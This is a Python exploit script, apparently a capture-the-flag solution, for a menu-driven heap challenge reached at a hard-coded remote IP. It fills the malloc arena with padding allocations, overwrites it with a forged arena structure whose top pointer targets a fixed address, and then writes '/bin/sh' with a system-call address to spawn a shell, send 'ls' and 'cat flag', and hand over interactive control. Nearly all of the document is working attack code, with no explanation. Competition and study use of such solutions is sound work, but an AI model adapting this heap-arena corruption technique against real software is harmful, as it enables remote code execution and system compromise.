#!/usr/bin/env python3

from time import sleep
import socket
import sys
import telnetlib

def _p32(num):
    return num.to_bytes(4, byteorder='little')

def _p64(num):
    return num.to_bytes(8, byteorder='little')

def u32(byte_string):
    byte4 = byte_string.ljust(4, b'\0')
    return int.from_bytes(byte4, byteorder='little')

def u64(byte_string):
    byte8 = byte_string.ljust(8, b'\0')
    return int.from_bytes(byte8, byteorder='little')

def p32(*nums):
    data = b''
    for num in nums:
        data += _p32(num)
    return data

def p64(*nums):
    data = b''
    for num in nums:
        data += _p64(num)
    return data

# This is the modified version of interact() in telnetlib.
# It can receive non-ascii data.
# Original interact() is here:
#     https://github.com/python/cpython/blob/master/Lib/telnetlib.py
def _xinteract(tel):
    import selectors
    with telnetlib._TelnetSelector() as selector:
        selector.register(tel, selectors.EVENT_READ)
        selector.register(sys.stdin, selectors.EVENT_READ)

        while True:
            for key, events in selector.select():
                if key.fileobj is tel:
                    try:
                        text = tel.read_eager()
                    except EOFError:
                        print('*** Connection closed by remote host ***')
                        return
                    if text:
                        string = text.decode('ascii', 'backslashreplace')
                        sys.stdout.write(string)
                        sys.stdout.flush()
                        print(string, end='')
                elif key.fileobj is sys.stdin:
                    line = sys.stdin.readline().encode('ascii')
                    if not line:
                        return
                    tel.write(line)

class PwnSocket:
    def __init__(self, ip, port):
        self.silent_flag = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((ip, port))

    def shell(self):
        tel = telnetlib.Telnet()
        tel.sock = self.sock
        _xinteract(tel)

    def print_bytes(self, byte_str):
        if not self.silent_flag:
            string = byte_str.decode('ascii', 'backslashreplace')
            sys.stdout.write(string)
            sys.stdout.flush()

    def send(self, message):
        self.print_bytes(message)
        self.sock.send(message)

    def send_str(self, string):
        self.send(string.encode('ascii'))

    def send_int(self, num):
        self.send_str(str(num) + '\n')

    def recv_until(self, delimiter_bytes):
        received_data = b''
        while not received_data.endswith(delimiter_bytes):
            tmp = self.sock.recv(1)
            self.print_bytes(tmp)
            received_data += tmp
        return received_data

    def recv(self, num):
        data = self.sock.recv(num)
        self.print_bytes(data)
        return data

    def set_silent(self):
        self.silent_flag = True

    def unset_silent(self):
        self.silent_flag = False

    def select_menu(self, num):
        self.recv_until(b'Action: ')
        self.send_int(num)

    def use(self, data, size, pad_blocks, is_content=True):
        self.select_menu(1)
        self.recv_until(b'Size: ')
        self.send_int(size)
        self.recv_until(b'blocks: ')
        self.send_int(pad_blocks)
        self.recv_until(b'Content? (0/1): ')
        if not is_content:
            self.send_int(0)
            return
        self.send_int(1)
        self.recv_until(b'Input: ')
        if size < len(data):
            self.send(data[:size-1])
            sleep(0.1)
            self.send(data[size-1:])
        else:
            self.send(data.ljust(size, b'\0'))

    def pad(self, size, pad_blocks):
        self.use(b'A', size, pad_blocks, False)

    def exit(self):
        self.select_menu(2)

    def show_id(self):
        self.select_menu(1337)
        self.recv_until(b'\n')

def main(target):
    if target == 'remote':
        ip = '47.75.57.242'
        port = 5000
    else:
        hostname = 'localhost'
        ip = socket.gethostbyname(hostname)

    if target == 'debug':
        port = 12345
    elif target == 'no-debug':
        port = 23456

    max_size = 0x4000
    max_pads =  0x3e8
    target_addr = 0x602020
    ptr_to_target = 0x4004d0
    size0x70 = 0x602010 + 5 - 8
    call_system = 0x400e4d

    malloc_start_gdb = 0x00007ffff00008c0
    arena_end_gdb    = 0x00007ffff4000000
    heap_offset = malloc_start_gdb & 0xfff
    arena_size = arena_end_gdb - malloc_start_gdb + heap_offset

    ps = PwnSocket(ip, port)
    if target == 'remote':
        ps.recv_until(b'PoW : ')
        ps.send_str(input() + '\n')

    ps.recv_until(b'password:')
    ps.send_str("i'm ready for challenge\n")
    content = 'hoge'
    size = max_size - 8
    pads = 0x200-1
    aligned_size = size - heap_offset

    ps.set_silent()
    ps.pad(aligned_size, 0)
    ps.pad(size, pads-2)

    for i in range(arena_size//(size*(pads+1)) - 1):
        ps.pad(size, pads)

    ps.pad(size-0x40, 0)
    ps.pad(size, pads)
    for i in range(arena_size//(size*pads) - 2):
        ps.pad(size, pads)

    ps.pad(size-0x40, 0)
    ps.pad(size, pads)
    for i in range(arena_size//(size*pads) - 1):
        ps.pad(size, pads)

    ps.pad(size, pads-2)

    print('==== overwrite ====')
    fake_arena = p64(0, 0, 0x4000000, 0x4000000) # ar_ptr, prev, size, aligned_size
    fake_arena += p64(0x300000000) # mutex
    fake_arena += p64(0)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(size0x70)
    fake_arena += p64(target_addr) # top
    fake_arena += p64(0)
    fake_arena += p64(ptr_to_target)
    fake_arena += p64(ptr_to_target)

    final_size = max_size-0x100
    top_offset = 328
    arena_offset = 208
    ps.unset_silent()

    #with open('pat.txt', 'rb') as f:
        #data = f.read(arena_offset)
    data = b'A' * (final_size + arena_offset) + fake_arena
    ps.use(data, final_size, 0)

    #ar_ptr_offset = final_size + arena_offset
    #data = b'A' * (ar_ptr_offset-0x100) + fake_arena
    #data = data.ljust(ar_ptr_offset, b'B') + b'\x20\xff\xff\xef'
    #ps.use(data, final_size, 0)

    #ps.use(b'/bin/sh\0' + p64(call_system), 0x100, 0)
    ps.use(b'/bin/sh\0' + b'A' * 19 + p64(call_system), 0x68, 0)

    ps.send(b'ls\n')
    ps.send(b'cat flag\n')
    ps.shell()

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '--remote':
        target = 'remote'
    elif len(sys.argv) == 2 and sys.argv[1] == '--no-debug':
        target = 'no-debug'
    else:
        target = 'debug'
    main(target)
